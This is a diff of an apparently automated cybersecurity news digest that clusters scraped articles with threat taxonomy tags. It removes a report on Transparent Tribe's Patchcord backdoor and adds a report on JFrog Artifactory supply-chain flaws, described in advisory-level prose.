Powering Cyber-Attacks. Can it Power Cyber Defense? Opinion 3 July 2026 3 ICO Urges Police to Improve Data Governance in Facial Recognition Rollouts News 19 August 2026 4 NASA Ground Control Software Flaw Enables Unauthenticated Commands News 18 August 2026 5 Three-quarters of Ransomware Attacks Target Mid-Market Firms News 18 August 2026 6 NIST Seeks Public Input on AI-Ready NVD Modernization News 12 August 2026 1 Novel macOS Infostealer AmnesiaStealer Spread via C
-```
-
-#### Corroborating sources (1)
-
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: JFrog Artifactory Flaws Enable Software Supply Chain Attacks
-  - Published: 2026-08-20T14:30:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/
-  - Summary: Two Artifactory flaws allowed attackers to poison package metadata across software repositories
 
 ### Cluster 7029814c59 — score 9
 
@@ -3211,49 +3115,6 @@ Cisco on Wednesday announced patches for 15 vulnerabilities across its products,
   - Link: https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/
   - Summary: The flaws could lead to remote code execution, authentication bypasses, and path traversal attacks. The post Cisco Patches Critical Crosswork, Secure Workload Vulnerabilities appeared first on SecurityWeek .
 
-### Cluster 6b62271cd9 — score 8
-
-- Title: Pakistan's Transparent Tribe Refreshes Toolset for Afghan Cyberattacks
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-08-20T14:59:22+00:00
-- Link: https://www.darkreading.com/cyberattacks-data-breaches/pakistan-transparent-tribe-afghan-cyberattacks
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor
-- affected_industries: critical_infrastructure, government, telecommunications
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng, apt_espionage, web_shell_backdoor
-- affected_industries: government, critical_infrastructure, telecommunications
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-A nation-state threat actor is picking on immature organizations run by the Taliban, but failing against more prepared government agencies in India.
-```
-
-#### Full body
-
-```
-Cyberattacks & Data Breaches Threat Intelligence Endpoint Security Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Pakistan's Transparent Tribe Refreshes Toolset for Afghan Cyberattacks A nation-state threat actor is picking on immature organizations run by the Taliban, but failing against more prepared government agencies in India. Nate Nelson , Contributing Writer August 20, 2026 5 Min Read Source: Juanmonino via Getty Images A Pakistani threat actor has been using a novel malware to spy on high-value targets in Afghanistan, but the same attacks have been running up against a wall in India. The culprit is Transparent Tribe (aka APT 36), which might be Pakistan's most active advanced persistent threat (APT) actor. More often than not, it has been found spying on governments and militaries in neighboring India and Afghanistan. The nature of its cyber espionage has long led researchers to believe that it works for the Pakistani state. This year, researchers from Acronis have observed Transparent Tribe doing its usual business, but with a sharpened-up toolset: fresh backdoors called "Patchcord" and "Sheetcord." Patchcord in particular is a bit of an uneven thing: it's perfectly capable at command-and-control (C2) and anti-analysis, but its main trick is an old and largely detectable persistence mechanism in which the malware hijacks victims' desktop shortcuts. Related: 'Grandoreiro' Malware Resurfaces With Mexico Campaign Recent targets in Afghanistan have included major government and telecommunications organizations, and oddly small fish, including a small business and an unidentified individual, according to Acronis. The group also appears to have been targeting Indian organizations, though no successful compromises there have yet been confirmed. Transparent Tribe's Cyberattacks in Afghanistan & India Transparent Tribe's campaign in Afghanistan and India dates back to at least last December. It appears to have ramped up in May, and remains ongoing to this day. Researchers have deduced the hackers' lofty ambitions from its social engineering tactics. Its phishing lures have impersonated network and logistics tools used by a large Afghani telecommunications company, a fuel-conservation tool for India's energy sector, an Indian government employee benefits resource, and so on. Its C2 domains have likewise impersonated major Indian government organizations and Afghani telecoms. Dark Reading has specifically confirmed that Transparent Tribe successfully infected an Afghan subsidiary of an international company, as well as an IT officer at the Khost branch of the state-owned Afghan Telecom (AFTEL). "The threat actor has been stealing data from his desktop and looking into his WhatsApp and private data," says Acronis senior threat researcher Subhajeet Singha. "They're trying to use that data to [design] decoy Excel files, or something like it, to phish some more employees. Then laterally moving into the entire company." The threat actor shot even higher in India. It developed phishing paraphernalia tailored to multiple government agencies, including the Ministries of Defense and Foreign Affairs, the National Informatics Centre (part of the the Ministry of Electronics and Information Technology), as well as the Indian Air Force. As mentioned, no evidence suggests that these attacks were successful, though. Related: China-Linked Hacker Shows AI Capabilities in APAC Attack The Patchcord Pakistani Backdoor Malware Behind many of Transparent Tribe's phishing lures lies Patchcord, a newly documented C++ implant. Patchcord supports a few basic functions like host fingerprinting and process enumeration, but most importantly, it's designed to run arbitrary code in-memory. A variant of Patchcord first seen in March also implemented a variety of checks for detecting whet
-```
-
-#### Corroborating sources (1)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: Pakistan's Transparent Tribe Refreshes Toolset for Afghan Cyberattacks
-  - Published: 2026-08-20T14:59:22+00:00
-  - Link: https://www.darkreading.com/cyberattacks-data-breaches/pakistan-transparent-tribe-afghan-cyberattacks
-  - Summary: A nation-state threat actor is picking on immature organizations run by the Taliban, but failing against more prepared government agencies in India.
-
 ### Cluster 2c8acd9c63 — score 8
 
 - Title: Scottish Govt Suffers Potentially Widening Data Breach at Prosecutor's Office
@@ -3428,6 +3289,57 @@ The expensive attacks are not always the clever ones. This week had plenty of pr
   - Link: https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
   - Summary: The expensive attacks are not always the clever ones. This week had plenty of proof. Exposed services got hit, old bugs found fresh use, browser sessions became attack paths, and supply-chain problems kept spreading farther than the original compromise. A lot of it came down to access that was already there and defenses that assumed nobody would look too closely. So, nothing magical. Just a
 
+### Cluster 2d052ce523 — score 8
+
+- Title: JFrog Artifactory Flaws Enable Software Supply Chain Attacks
+- Source: Infosecurity Magazine (cyber_news_breach_reporting)
+- Published: 2026-08-20T14:30:00+00:00
+- Link: https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion, supply_chain
+- actor_attribution: Medusa
+- affected_industries: critical_infrastructure
+- affected_products: Apple iOS/macOS, GitHub, npm
+- cve_ids: CVE-2026-65922, CVE-2026-69106
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, credential_theft
+- actor_attribution: Medusa
+- affected_industries: critical_infrastructure
+- affected_products: Apple iOS/macOS, GitHub, npm
+- cve_ids: CVE-2026-69106, CVE-2026-65922
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Two Artifactory flaws allowed attackers to poison package metadata across software repositories
+```
+
+#### Full body
+
+```
+Infosecurity Magazine Home » News » JFrog Artifactory Flaws Enable Software Supply Chain Attacks JFrog Artifactory Flaws Enable Software Supply Chain Attacks News 20 August 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino Two vulnerabilities in JFrog Artifactory have been found which allow anonymous or low-privileged users to manipulate package metadata without modifying the underlying artifacts, creating a potential route to software supply chain compromise. Oligo Security reported the flaws to JFrog on June 25 and detailed them in research published on August 20. The findings cover CVE-2026-69106 (CVSS score 8.8), which affects the handling of the X-Orig-Client-Uri header, and CVE-2026-65922 (CVSS score 5.4), which allows writes into trusted .jfrog/ metadata paths. Both flaws are listed on the National Vulnerability Database and JFrog has issued fixes . Header Trust Enables Shared Cache Poisoning CVE-2026-69106 stemmed from Artifactory accepting X-Orig-Client-Uri from external clients without verifying that it originated from trusted routing infrastructure. Oligo found that virtual repositories could turn this into a cross-user cache poisoning issue. In Helm, the full attacker-controlled URL was written into generated metadata while only its 32-bit Java hash was used to determine the cache location. A different URL could therefore be constructed with the same hash and cause a poisoned index to be served to later users. npm had a separate cache guard, but it checked two other override headers and not X-Orig-Client-Uri. The researchers also identified a related issue in JFrog's recommended nginx configuration, where X-Forwarded-Proto could be used to influence generated absolute URLs when a caching reverse proxy was deployed. Read more on software supply chain attacks: GitHub to Update npm to Thwart Software Supply Chain Attacks Trusted Metadata Paths Bypass Normal Controls CVE-2026-65922, on the other hand, affected Artifactory's handling of internal .jfrog/ metadata. The REST COPY and MOVE APIs and WebDAV MKCOL could reach these paths without the normal protection applied to standard uploads. The resulting authorization path treated .jfrog/ as trusted, allowing an authenticated user with suitable repository access to place or create content there. Oligo said these files are consumed by package handlers for functions including npm signing keys, OCI referrers, Docker indexes and Ansible indexes. The researchers recommended upgrading Artifactory to a patched release and disabling anonymous access where it is not required, particularly in shared or internet-accessible environments. They also advised reviewing users and service accounts with repository access and stripping or overwriting client-supplied X-Orig-Client-Uri and X-Forwarded-Proto headers at the routing boundary. You may also like Critical CVEs in Chaos-Mesh Enable In-Cluster Code Execution News 17 September 2025 Hackers Use NuGet Packages to Target .NET Developers News 21 March 2023 Lookalike npm Package Hides a Multi-Stage Windows RAT News 23 June 2026 Flaws Expose Risks in Fluent Bit Logging Agent News 24 November 2025 High-Severity Access Control Vulnerability Found in Spring WebFlux News 9 August 2023 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice JFrog Artifactory Flaws Enable Software Supply Chain Attacks News 20 August 2026 1 US Defense Contractors Admit Their Rising CMMC Scores May Not Be Accurate News 20 August 2026 2 OpenAI Tightens AI Safeguards Following Hugging Face Incident News 19 August 2026 3 Over 500 Critical Infrastructure Organizations Hit by Medusa Ransomware News 19 August 2026 4 NCSC Urges Stronger Controls for Agentic AI Systems News 20 August 2026 5 Def Con Attendees Targeted by Persistent Phishing Campaign News 20 August 2026 6 Novel macOS Infostealer AmnesiaStealer Spread via ClickFix News 14 August 2026 1 NASA Ground Control Software Flaw Enables Unauthenticated Commands Ne
+```
+
+#### Corroborating sources (1)
+
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - Title: JFrog Artifactory Flaws Enable Software Supply Chain Attacks
+  - Published: 2026-08-20T14:30:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/
+  - Summary: Two Artifactory flaws allowed attackers to poison package metadata across software repositories
+
 ### Cluster 1293349fdc — score 8
 
 - Title: Three-quarters of Ransomware Attacks Target Mid-Market Firms
@@ -3483,19 +3395,19 @@ Infosecurity Magazine Home » News » Three-quarters of Ransomware Attacks Targe
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, data_breach, phishing_social_eng, ransomware_extortion
+- threat_categories: credential_theft, data_breach, phishing_social_eng, ransomware_extortion, supply_chain
 - actor_attribution: Medusa
 - affected_industries: critical_infrastructure, financial_services, government, manufacturing_industrial
-- affected_products: Apple iOS/macOS, OpenAI/ChatGPT
+- affected_products: Apple iOS/macOS
 - urgency_signals: preauth_unauth
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, data_breach
+- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, credential_theft, data_breach
 - actor_attribution: Medusa
 - affected_industries: financial_services, government, critical_infrastructure, manufacturing_industrial
-- affected_products: Apple iOS/macOS, OpenAI/ChatGPT
+- affected_products: Apple iOS/macOS
 - urgency_signals: preauth_unauth
 - content_type: incident_report
 - confidence_tier: tier_4_news
@@ -3509,7 +3421,7 @@ Nearly 40,000 customers of hardware wallet provider SafePal have been impacted b
 #### Full body
 
 ```
-Infosecurity Magazine Home » News » SafePal Data Breach Hits Tens of Thousands of Customers SafePal Data Breach Hits Tens of Thousands of Customers News 17 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster The manufacturer of a popular cryptocurrency hardware wallet has told tens of thousands of its customers to be on the lookout for phishing attempts after it suffered a data breach. SafePal published an update on August 16 claiming that order information linked to 39,798 customers had been compromised in a recent incident. Customers who placed order between March 2, 2025 and April 11, 2026 are impacted. The stolen data includes names, email and shipping addresses, phone numbers and purchase details. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” SafePal clarified. “SafePal never requests, collects, processes or stores such information from customers. No evidence has been found that the incident itself compromised access to SafePal wallets or funds.” Read more on crypto breaches: Coldcard Users Lose $89m After Bitcoin Wallet Is Hacked The breach appears to have stemmed from a vulnerability in the firm’s order-tracking function for a plug-in. “Under certain conditions, the flaw allowed unauthorized access to another customer's order information. We remediated the issue upon discovery and introduced additional security measures,” SafePal explained. The firm warned customers to expect “fraudulent phone calls, emails, text messages, letters, refund offers, firmware-update requests, fake customer-support communications” and other attempts to obtain their wallet credentials or additional personal information. It said it had already taken down over 30 fraudulent websites and phishing links associated with the incident. According to screenshots posted to X , an individual has put the stolen data up for sale, although their claims have not been verified. Advice for SafePal Customers SafePal has published a dedicated page via which to report scams, and a support channel for affected customers. It issued the following advice: Never share your seed phrase, private key, or password with anyone, even if they claim to be a SafePal employee Don’t click links or scan QR codes in unsolicited emails, text messages, or letters claiming to be from SafePal Type the SafePal web address manually into the browser rather than following a redirected link, including any link that appears to come from this notice Be on the lookout for any suspicious communication or impersonation, whether by phone, post or in person Report anything suspicious, including messages, calls, letters or websites You may also like Los Angeles Public Health Department Discloses Large Data Breach News 17 June 2024 BBC Pension Scheme Breached, Exposing Employee Data News 31 May 2024 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Over 80% of Sports Organizations Targeted by Hackers in the Last Year News 12 June 2026 Qantas Confirms 5.7 Million Customers Hit by Data Breach News 10 July 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice OpenAI Tightens AI Safeguards Following Hugging Face Incident News 19 August 2026 1 Over 500 Critical Infrastructure Organizations Hit by Medusa Ransomware News 19 August 2026 2 AI is Already Powering Cyber-Attacks. Can it Power Cyber Defense? Opinion 3 July 2026 3 ICO Urges Police to Improve Data Governance in Facial Recognition Rollouts News 19 August 2026 4 NASA Ground Control Software Flaw Enables Unauthenticated Commands News 18 August 2026 5 Three-quarters of Ransomware Attacks Target Mid-Market Firms News 18 August 2026 6 NIST Seeks Public Input on AI-Ready NVD Modernization News 12 August 2026 1 Novel macOS Infostealer AmnesiaStealer Spread via ClickFix Ne
+Infosecurity Magazine Home » News » SafePal Data Breach Hits Tens of Thousands of Customers SafePal Data Breach Hits Tens of Thousands of Customers News 17 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster The manufacturer of a popular cryptocurrency hardware wallet has told tens of thousands of its customers to be on the lookout for phishing attempts after it suffered a data breach. SafePal published an update on August 16 claiming that order information linked to 39,798 customers had been compromised in a recent incident. Customers who placed order between March 2, 2025 and April 11, 2026 are impacted. The stolen data includes names, email and shipping addresses, phone numbers and purchase details. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” SafePal clarified. “SafePal never requests, collects, processes or stores such information from customers. No evidence has been found that the incident itself compromised access to SafePal wallets or funds.” Read more on crypto breaches: Coldcard Users Lose $89m After Bitcoin Wallet Is Hacked The breach appears to have stemmed from a vulnerability in the firm’s order-tracking function for a plug-in. “Under certain conditions, the flaw allowed unauthorized access to another customer's order information. We remediated the issue upon discovery and introduced additional security measures,” SafePal explained. The firm warned customers to expect “fraudulent phone calls, emails, text messages, letters, refund offers, firmware-update requests, fake customer-support communications” and other attempts to obtain their wallet credentials or additional personal information. It said it had already taken down over 30 fraudulent websites and phishing links associated with the incident. According to screenshots posted to X , an individual has put the stolen data up for sale, although their claims have not been verified. Advice for SafePal Customers SafePal has published a dedicated page via which to report scams, and a support channel for affected customers. It issued the following advice: Never share your seed phrase, private key, or password with anyone, even if they claim to be a SafePal employee Don’t click links or scan QR codes in unsolicited emails, text messages, or letters claiming to be from SafePal Type the SafePal web address manually into the browser rather than following a redirected link, including any link that appears to come from this notice Be on the lookout for any suspicious communication or impersonation, whether by phone, post or in person Report anything suspicious, including messages, calls, letters or websites You may also like Los Angeles Public Health Department Discloses Large Data Breach News 17 June 2024 BBC Pension Scheme Breached, Exposing Employee Data News 31 May 2024 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Over 80% of Sports Organizations Targeted by Hackers in the Last Year News 12 June 2026 Qantas Confirms 5.7 Million Customers Hit by Data Breach News 10 July 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice JFrog Artifactory Flaws Enable Software Supply Chain Attacks News 20 August 2026 1 US Defense Contractors Admit Their Rising CMMC Scores May Not Be Accurate News 20 August 2026 2 OpenAI Tightens AI Safeguards Following Hugging Face Incident News 19 August 2026 3 Over 500 Critical Infrastructure Organizations Hit by Medusa Ransomware News 19 August 2026 4 NCSC Urges Stronger Controls for Agentic AI Systems News 20 August 2026 5 Def Con Attendees Targeted by Persistent Phishing Campaign News 20 August 2026 6 Novel macOS Infostealer AmnesiaStealer Spread via ClickFix News 14 August 2026 1 NASA Ground Control Software Flaw Enables Unauthenticated Commands News 18 Augu
 ```
 
 #### Corroborating sources (1)
